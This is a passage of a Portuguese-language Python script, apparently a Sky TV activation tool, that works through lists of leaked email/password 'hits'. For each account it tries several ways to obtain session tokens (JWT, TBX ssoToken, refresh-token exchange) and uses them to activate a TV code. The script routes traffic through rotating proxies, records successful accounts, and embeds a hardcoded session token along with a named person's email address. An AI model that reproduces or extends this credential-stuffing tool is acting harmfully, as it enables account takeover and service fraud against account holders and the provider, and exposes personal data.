                    print(f"{Fore.GREEN}  [✓] web_access_token OK: {web_access_token[:25]}...{Style.RESET_ALL}")

        # ── 4. ESTRATÉGIA A: fetch_id_token via authorizationSignature ──
        sig_jwt = None
        sig_id_chosen = None
        if web_access_token and payload_web:
            sig_ids = [str(s.get("id", "")) for s in signatures if s.get("id")]
            if not sig_ids:
                sig_ids = [""]
            for sig_id in sig_ids:
                jwt = activator.fetch_id_token(sig_id, web_access_token, payload_web)
                if jwt and "ey" in jwt:
                    sig_jwt = jwt
                    sig_id_chosen = sig_id
                    with print_lock:
                        print(f"{Fore.GREEN}  [✓] JWT via authorizationSignature: {jwt[:25]}...{Style.RESET_ALL}")
                    break

        if not sig_jwt and cached_jwt and "ey" in cached_jwt:
            sig_jwt = cached_jwt

        # ── 5. ESTRATÉGIA B: TBX ssoToken via OAuth / Assert (sp.tbxnet.com) ──
        with print_lock:
            print(f"{Fore.YELLOW}  [+] Obtendo TBX ssoToken (sp.tbxnet.com)...{Style.RESET_ALL}")
        tbx_sso = activator._fetch_sso_token_tbx(
            email, password, payload_web,
            web_access_token=web_access_token,
            jwt_token=sig_jwt,
            signature_id=sig_id_chosen
        )
        if hasattr(activator, "discovered_tbx_tokens") and activator.discovered_tbx_tokens:
            for t_val, t_desc in activator.discovered_tbx_tokens:
                if t_val and ("ey" in t_val or len(t_val) >= 32):
                    candidate_tokens.append((t_val, t_desc))
        elif tbx_sso and ("ey" in tbx_sso or len(tbx_sso) >= 32):
            candidate_tokens.append((tbx_sso, "TBX ssoToken oficial"))

        if sig_jwt and "ey" in sig_jwt:
            candidate_tokens.append((sig_jwt, f"JWT signature {sig_id_chosen or 'ativo'}"))

        # ── 6. ESTRATÉGIA C: Token JWT em cache do sky.py ──
        if cached_jwt and "ey" in cached_jwt and cached_jwt != sig_jwt:
            candidate_tokens.append((cached_jwt, "JWT cache local"))

        # ── 7. ESTRATÉGIA D: ssoToken de troca de refresh_token ──
        sso_from_refresh = auth_info.get("sso_token")
        if sso_from_refresh and "ey" in sso_from_refresh:
            candidate_tokens.append((sso_from_refresh, "JWT refresh_token"))

        if not candidate_tokens:
            print_fail(email, tv_code, "Nenhum JWT ou ssoToken válido encontrado para esta conta")
            save_activation_log(email, password, tv_code, False, "Nenhum ssoToken disponível")
            return False

        # ── 9. Executa tentativas de ativação com cada token ──
        for token_val, token_desc in candidate_tokens:
            with print_lock:
                print(f"{Fore.CYAN}  Testando ativação com [{token_desc}]...{Style.RESET_ALL}")
            result = activator.activate_tv(token_val, tv_code)
            if result.get("success"):
                print_success(email, tv_code, f"{result['message']} (usando {token_desc})")
                save_activation_log(email, password, tv_code, True, f"{result['message']} (usando {token_desc})")
                record_account_activated(email, password, tv_code)
                if stop_event:
                    stop_event.set()
                return True
            else:
                msg = result.get("message", "")
                with print_lock:
                    print(f"{Fore.YELLOW}  -> {token_desc}: {msg}{Style.RESET_ALL}")
                # Se o erro for TV inválida (ex: 404 código expirado / não encontrado), para de testar tokens
                if "not found" in msg.lower() or "404" in msg.lower() or "expirado" in msg.lower():
                    print_fail(email, tv_code, f"Código da TV inválido ou expirado: {msg}")
                    save_activation_log(email, password, tv_code, False, msg)
                    return False

        print_fail(email, tv_code, "Todos os tokens falharam na ativação")
        save_activation_log(email, password, tv_code, False, "Todos os tokens falharam")
        return False
    finally:
        activator.close()

def run_activation_loop(
    accounts: List[Tuple[str, str]], tv_code: str,
    use_proxy: bool = True,
    payload_android: Optional[str] = None,
    payload_web: Optional[str] = None,
    stop_on_first: bool = True,
):
    stop_event = threading.Event() if stop_on_first else None
    total = len(accounts)
    print(f"\n{Fore.CYAN}Total de contas: {total}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Codigo da TV  : {tv_code}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Proxy         : {'DataImpulse (rotativo)' if use_proxy else 'Desabilitado'}{Style.RESET_ALL}")
    if stop_on_first:
        print(f"{Fore.CYAN}Modo          : Para no primeiro sucesso{Style.RESET_ALL}")
    print()

    for i, (email, password) in enumerate(accounts, 1):
        if stop_event and stop_event.is_set():
            print(f"\n{Fore.GREEN}TV ja ativada! Encerrando...{Style.RESET_ALL}")
            break
        print(f"{Fore.CYAN}[{i}/{total}]{Style.RESET_ALL}", end=" ")
        success = activate_with_account(
            email, password, tv_code, use_proxy,
            payload_android, payload_web, stop_event
        )
        if success and stop_on_first:
            break
        if i < total and not (stop_event and stop_event.is_set()):
            time.sleep(1.5)

    print(f"\n{Fore.CYAN}=== Finalizado. Log salvo em hits/ativacoes_tv.txt ==={Style.RESET_ALL}")

# ============================================================
# MENU
# ============================================================
def main():
    print_banner()

    # Carrega payloads (mesmos arquivos do sky.py)
    payload_android = None
    payload_web     = None

    p_and_path = os.path.join(BASE_DIR, "payload.b64")
    if os.path.exists(p_and_path):
        try:
            with open(p_and_path, "r", encoding="utf-8") as f:
                payload_android = f.read().strip()
            print(f"{Fore.GREEN}[+] payload.b64 carregado (Android/Email){Style.RESET_ALL}")
        except Exception:
            pass
    else:
        print(f"{Fore.YELLOW}[!] payload.b64 nao encontrado{Style.RESET_ALL}")

    p_web_path = os.path.join(BASE_DIR, "payload_web.b64")
    if os.path.exists(p_web_path):
        try:
            with open(p_web_path, "r", encoding="utf-8") as f:
                payload_web = f.read().strip()
            print(f"{Fore.GREEN}[+] payload_web.b64 carregado (Web/CPF){Style.RESET_ALL}")
        except Exception:
            pass
    else:
        print(f"{Fore.YELLOW}[!] payload_web.b64 nao encontrado{Style.RESET_ALL}")

    print()
    print(f"{Fore.GREEN}[0]{Style.RESET_ALL} {Fore.YELLOW}Ativar TV INSTANTÂNEO (com sessão capturada do navegador){Style.RESET_ALL}")
    print(f"{Fore.GREEN}[1]{Style.RESET_ALL} Usar contas da pasta hits/ (automático)")
    print(f"{Fore.GREEN}[2]{Style.RESET_ALL} Informar arquivo de contas")
    print(f"{Fore.GREEN}[3]{Style.RESET_ALL} Digitar uma conta manualmente")
    print(f"{Fore.GREEN}[4]{Style.RESET_ALL} Sair")
    print()

    option = input(f"{Fore.CYAN}>> {Style.RESET_ALL}").strip()
    accounts: List[Tuple[str, str]] = []

    if option == "0":
        tv_code = input(f"\n{Fore.CYAN}Código de 6 dígitos exibido na TV: {Style.RESET_ALL}").strip()
        if not tv_code:
            print(f"{Fore.RED}Código não informado!{Style.RESET_ALL}")
            return

        if not DEFAULT_SSO_TOKEN:
            print(f"{Fore.RED}Nenhum SSO Token configurado!{Style.RESET_ALL}")
            return

        print(f"\n{Fore.CYAN}[+] Ativando TV {tv_code} com sessão ativa instantânea...{Style.RESET_ALL}")
        activator = SkyTVActivator(use_proxy=False)
        try:
            result = activator.activate_tv(
                token=DEFAULT_SSO_TOKEN,
                tv_code=tv_code,
                profile_token=DEFAULT_PROFILE_TOKEN
            )
            if result.get("success"):
                print_success("rsgencadernacoes@yahoo.com.br", tv_code, result.get("message", "TV ativada com sucesso!"))
                save_activation_log("rsgencadernacoes@yahoo.com.br", "sessao_ativa", tv_code, True, "TV ativada com sucesso!")
                record_account_activated("rsgencadernacoes@yahoo.com.br", "sessao_ativa", tv_code)
            else:
                msg = result.get("message", "Falha na ativação")
                print_fail("rsgencadernacoes@yahoo.com.br", tv_code, msg)
                save_activation_log("rsgencadernacoes@yahoo.com.br", "sessao_ativa", tv_code, False, msg)
        finally:
            activator.close()
        return

    elif option == "1":
        accounts = load_hits_from_hits_folder()
        if not accounts:
            print(f"{Fore.RED}Nenhuma conta na pasta hits/!{Style.RESET_ALL}")
            return
    elif option == "2":
        filepath = input(f"{Fore.CYAN}Caminho do arquivo: {Style.RESET_ALL}").strip()
        if not os.path.exists(filepath):
            print(f"{Fore.RED}Arquivo nao encontrado!{Style.RESET_ALL}")
            return
        accounts = load_hits_from_file(filepath) or load_simple_file(filepath)
        if not accounts:
            print(f"{Fore.RED}Nenhuma conta valida!{Style.RESET_ALL}")
            return
    elif option == "3":
        email    = input(f"{Fore.CYAN}Email/CPF: {Style.RESET_ALL}").strip()
        password = input(f"{Fore.CYAN}Senha    : {Style.RESET_ALL}").strip()
        if not email or not password:
            print(f"{Fore.RED}Email ou senha vazios!{Style.RESET_ALL}")
            return
        accounts = [(email, password)]
    else:
        return

    print()
    tv_code = input(f"{Fore.CYAN}Codigo exibido na TV: {Style.RESET_ALL}").strip()
    if not tv_code:
        print(f"{Fore.RED}Codigo nao informado!{Style.RESET_ALL}")
        return

    print()
    print(f"{Fore.GREEN}[1]{Style.RESET_ALL} Proxy DataImpulse (recomendado)")
    print(f"{Fore.GREEN}[2]{Style.RESET_ALL} Sem proxy")
    use_proxy = input(f"{Fore.CYAN}Modo proxy: {Style.RESET_ALL}").strip() != "2"

    print()
    print(f"{Fore.GREEN}[1]{Style.RESET_ALL} Parar ao primeiro sucesso")
    print(f"{Fore.GREEN}[2]{Style.RESET_ALL} Tentar todas as contas")
    stop_on_first = input(f"{Fore.CYAN}Opcao: {Style.RESET_ALL}").strip() != "2"

    run_activation_loop(accounts, tv_code, use_proxy, payload_android, payload_web, stop_on_first)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Interrompido.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Erro critico: {e}{Style.RESET_ALL}")
        raise
